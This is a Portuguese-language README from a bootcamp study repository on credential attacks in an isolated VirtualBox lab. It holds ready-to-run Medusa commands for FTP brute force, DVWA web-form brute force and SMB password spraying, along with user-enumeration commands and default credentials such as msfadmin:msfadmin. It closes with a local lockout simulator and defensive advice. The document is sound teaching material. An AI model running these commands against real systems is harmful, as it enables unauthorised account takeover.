# dio-brute-force-medusa
Simulando brute force para bootcamp DIO
# Estudo Prático: Força Bruta, Password Spraying e Defesa com Medusa

Este repositório reúne minhas anotações, wordlists de estudo, comandos de laboratório e uma simulação prática em Python para o desafio de cibersegurança da **DIO**.

A proposta aqui foi ir além de só decorar comandos: entender como ataques automatizados de autenticação funcionam na prática (em serviços como **FTP**, **DVWA** e **SMB**), onde eles costumam falhar e, principalmente, como travar esse tipo de tentativa do lado defensivo.

> **Importante:** Todos os exemplos deste projeto são para estudo em ambiente isolado. Os endereços IP usados nos comandos (`192.168.56.101` e `192.168.56.102`) são IPs privados fictícios de uma rede **Host-Only** de laboratório, não correspondendo a nenhum host real ou público.

---

## Como o laboratório foi pensado

No cenário clássico proposto pelo desafio, a ideia é isolar duas máquinas virtuais no **VirtualBox** usando uma rede **Host-Only** (`192.168.56.0/24`), sem saída para a internet:

- **Máquina Atacante (Kali Linux):** `192.168.56.101`
- **Máquina Alvo (Metasploitable 2 / DVWA):** `192.168.56.102`

```text
[ Kali Linux ] 192.168.56.101  <--- Rede Host-Only --->  192.168.56.102 [ Metasploitable 2 / DVWA ]
   (Medusa)                         (192.168.56.0/24)                        (FTP / HTTP / SMB)
```

Deixar tudo em *Host-Only* é uma regra básica que faz muita diferença: o Metasploitable 2 é propositalmente cheio de serviços vulneráveis, então jamais deve ficar exposto na rede local ou na internet.

Como nem sempre dá para subir duas VMs pesadas no dia a dia, aproveitei a flexibilidade do desafio para combinar duas frentes neste repositório:
1. O **roteiro documentado com Medusa** para os três cenários (FTP, formulário web no DVWA e SMB).
2. Um **simulador local em Python** ([`scripts/lab_auth_sim.py`](scripts/lab_auth_sim.py)) que roda direto no terminal Linux e mostra, em segundos, a diferença entre um login aberto e um login protegido por bloqueio de conta.

---

## Wordlists de estudo

Para não trabalhar com arquivos gigantes sem necessidade, montei duas listas curtas e diretas para testes controlados:

- [`wordlists/users.txt`](wordlists/users.txt): usuários comuns de laboratório (`admin`, `msfadmin`, `postgres`, `service`, `tomcat`, etc.).
- [`wordlists/passwords.txt`](wordlists/passwords.txt): senhas fracas e padrões bastante recorrentes em ambientes de teste (`123456`, `admin`, `password`, `msfadmin`, `toor`, etc.).

---

## Cenários de Ataque Estudados (Referência com Medusa)

### 1. Força Bruta no FTP (`192.168.56.102:21`)

O FTP tradicional envia usuário e senha em texto claro e, quando está mal configurado (sem *Fail2Ban* ou limite de tentativas), aceita centenas de combinações sem reagir.

Comando usado para testar o serviço no alvo fictício `192.168.56.102`:

```bash
medusa -h 192.168.56.102 -U wordlists/users.txt -P wordlists/passwords.txt -M ftp -t 4 -f
```

O que cada parâmetro faz aqui:
- `-h 192.168.56.102`: define o host alvo.
- `-U` e `-P`: apontam para as wordlists de usuários e senhas.
- `-M ftp`: seleciona o módulo FTP.
- `-t 4`: usa 4 conexões paralelas (sem exagerar para não derrubar o serviço).
- `-f`: para assim que a primeira credencial válida aparecer.

Depois que o Medusa aponta uma combinação válida (por exemplo, `msfadmin`), a conferência manual é simples:

```bash
ftp 192.168.56.102
```

---

### 2. Automação em Formulário Web no DVWA (`192.168.56.102:80`)

Em aplicações web, não basta apontar a ferramenta para a URL — primeiro é preciso olhar como a página conversa com o servidor. Pelo **Chrome DevTools (`F12` → aba Network)**, dá para capturar exatamente o que vai na requisição de login do DVWA:

- **Caminho do módulo:** `/vulnerabilities/brute/`
- **Cookies de sessão:** `PHPSESSID=a1b2c3d4e5f6...; security=low`
- **Parâmetros do formulário:** `username`, `password` e `Login=Login`
- **Mensagem quando erra:** `Username and/or password incorrect.`

Com esses dados em mãos, o comando no Medusa fica assim:

```bash
medusa -h 192.168.56.102 \
  -U wordlists/users.txt \
  -P wordlists/passwords.txt \
  -M web-form \
  -m FORM:"vulnerabilities/brute/?username=^USER^&password=^PASS^&Login=Login" \
  -m DENY-SIGNAL:"Username and/or password incorrect." \
  -m COOKIE:"PHPSESSID=a1b2c3d4e5f6; security=low" \
  -m FORM-METHOD:GET \
  -t 4 -f
```

> Um detalhe interessante do DVWA: quando você sobe o nível para `medium` ou `high`, entram atrasos propositais na resposta e *tokens anti-CSRF*. Na prática, isso mostra por que um formulário bem protegido já quebra scripts simples de força bruta.

---

### 3. Enumeração e Password Spraying em SMB (`192.168.56.102:445`)

Testar 50 senhas seguidas no mesmo usuário costuma disparar o bloqueio de conta logo nas primeiras tentativas. No **Password Spraying**, a lógica muda: você enumera os usuários antes e testa **uma única senha comum em todos eles** por rodada.

**Primeiro, listar usuários possíveis no SMB:**

```bash
enum4linux -U 192.168.56.102
# alternativa com Nmap:
nmap -p 445 --script smb-enum-users 192.168.56.102
```

**Depois, rodar o spraying com uma senha única (`-p`):**

```bash
medusa -h 192.168.56.102 -U wordlists/users.txt -p "123456" -M smbnt -t 2
```

**E validar caso alguma conta responda:**

```bash
smbclient -L //192.168.56.102 -U msfadmin
```

---

## Testando na Prática com Simulação em Python

Para não ficar só na teoria, escrevi o script [`scripts/lab_auth_sim.py`](scripts/lab_auth_sim.py). Ele sobe um servidor HTTP temporário apenas em `127.0.0.1` e dispara as mesmas listas de `wordlists/` nos dois formatos (**Força Bruta** e **Password Spraying**) contra duas rotas:

- `/login-vulnerable`: aceita tentativas ilimitadas.
- `/login-protected`: trava a conta com **HTTP 429** após **3 erros seguidos**.

Para rodar no terminal:

```bash
python3 scripts/lab_auth_sim.py
```

Resultado obtido na execução local:

```text
Servidor local de estudo ativo em http://127.0.0.1:36571

[Força Bruta | SEM proteção]
  Tentativas enviadas: 75
  Contas bloqueadas (HTTP 429): 0
  Credenciais descobertas: msfadmin:msfadmin, postgres:postgres

[Força Bruta | COM proteção (Lockout)]
  Tentativas enviadas: 27
  Contas bloqueadas (HTTP 429): 9
  Credenciais descobertas: nenhuma (bloqueado antes do acerto)

[Password Spraying | SEM proteção]
  Tentativas enviadas: 75
  Contas bloqueadas (HTTP 429): 0
  Credenciais descobertas: postgres:postgres, msfadmin:msfadmin

[Password Spraying | COM proteção (Lockout)]
  Tentativas enviadas: 27
  Contas bloqueadas (HTTP 429): 9
  Credenciais descobertas: nenhuma (bloqueado antes do acerto)
```

*(A porta em `127.0.0.1` muda a cada execução porque o script pede uma porta livre ao sistema operacional.)*

---

## Como Prevenir na Vida Real

Olhando pelo lado defensivo, o que realmente segura esse tipo de ataque no dia a dia não é uma medida isolada, mas a soma de várias camadas:

- **Limitar tentativas e bloquear origem:** configurar *Account Lockout* temporário e *Rate Limiting* (no Linux, o **Fail2Ban** resolve muito bem para SSH, FTP e aplicações web).
- **Exigir MFA (Autenticação Multifator):** mesmo quando alguém acerta uma senha fraca via *password spraying*, o segundo fator trava a invasão.
- **Cortar credenciais padrão e senhas óbvias:** contas como `msfadmin:msfadmin` ou `postgres:postgres` ainda aparecem em ambientes reais por descuido de implantação.
- **Proteger formulários web:** usar **tokens anti-CSRF**, **CAPTCHA** após falhas seguidas, atraso progressivo na resposta e sempre manter o tráfego em **HTTPS**.
- **Endurecer FTP e SMB:** trocar FTP puro por **SFTP/FTPS**, desativar **SMBv1** e listagem anônima de usuários, habilitar **SMB Signing** e nunca deixar a porta `445` aberta para fora da rede interna.
- **Monitorar logs:** observar picos de erro `401`/`429` em vários usuários diferentes no mesmo minuto — esse é o sinal clássico de que alguém está fazendo *password spraying*.

---

## O que tirei desse estudo

1. **Ataque automatizado depende de contexto:** sem olhar o tráfego da aplicação (como os cookies e respostas no DevTools) ou enumerar usuários antes, a wordlist sozinha perde muita eficiência.
2. **Lockout ajuda, mas não basta sozinho:** se o atacante espaçar as rodadas de *password spraying* além do tempo de desbloqueio, só o bloqueio por conta não resolve — por isso **MFA + senhas fortes + monitoramento** precisam andar juntos.
3. **Pequenos ajustes mudam tudo:** limitar 3 tentativas já derrubou a descoberta de credenciais na simulação local de 2 acertos para zero.
